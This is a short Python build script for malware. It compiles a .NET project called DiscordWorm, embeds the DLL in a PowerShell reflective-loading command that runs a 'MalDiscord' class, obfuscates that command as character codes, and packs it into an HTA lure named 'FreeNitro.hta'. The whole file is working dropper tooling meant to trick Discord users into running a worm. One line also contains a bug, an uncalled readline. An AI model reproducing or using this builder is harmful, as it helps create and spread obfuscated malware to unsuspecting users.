import subprocess
from base64 import b64encode
import sys
import os

DLL = os.path.abspath(os.path.join(os.getcwd(), os.pardir, 'Publish', 'DiscordWorm.dll'))

OUTDIR = os.path.abspath(os.path.join(os.getcwd(), os.pardir))

def compilecs() -> None:
    subprocess.check_call('dotnet publish -o ./Publish', cwd='..')


def build_ps1() -> str:
    dll = ''
    with open(DLL, 'rb') as f:
        dll = b64encode(f.read()).decode('ascii')
        f.close()

    command = f'`$blob="{dll}";[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(`$blob)).GetType(\'Discord2.MalDiscord\').GetMethod(\'Run\').Invoke(`$null, `$null);'
    
    return command


def obfuscate(string : str, sep : str ='@@@@@') -> str :
    return sep.join([str(ord(x)) for x in string])


def build_hta(nonsense: str) -> None : 
    with open('build.txt', 'r') as f, open(OUTDIR + '/FreeNitro.hta', 'w') as final:
        final.write(f.readline() + nonsense + f.readline)
        final.close()


def main():
    compilecs()
    build_hta(obfuscate(build_ps1()))


if __name__ == '__main__':
    main()